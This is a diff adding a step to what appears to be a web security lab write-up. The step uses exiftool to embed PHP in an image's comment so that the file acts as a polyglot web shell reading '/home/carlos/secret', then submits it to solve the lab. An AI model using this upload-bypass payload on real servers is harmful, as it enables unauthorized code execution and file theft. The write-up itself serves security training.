@@ -23,6 +23,23 @@ We tested with different payloads:
 ![image](https://github.com/user-attachments/assets/041f21e0-6908-4acd-9ca9-13d9491764db)
 ![image](https://github.com/user-attachments/assets/e6843e44-c8c7-4644-8af2-aa5fd01a828a)
 
+We attempted to submit a polyglot web shell using `exiftool`
+
+```bash
+exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" image.png -o polyglot.php
+```
+We are creating a polyglot file by embedding PHP code into the metadata of an image file (comments), allowing it to function both as an image and as a PHP script on a vulnerable server.
+
+![image](https://github.com/user-attachments/assets/e94ed620-306e-481c-a1bf-8104f6c7400f)
+
+Then we subbmitted the image and get the response on the repeater:
+![image](https://github.com/user-attachments/assets/f676ffe2-9172-4c8a-87a7-56b3bc2549c8)
+
+Once we had the code, we submitted this and solved the lab:
+![image](https://github.com/user-attachments/assets/a5095df6-1f34-4f36-8840-b4d8b50b21f0)
+
+
+
 
 
 
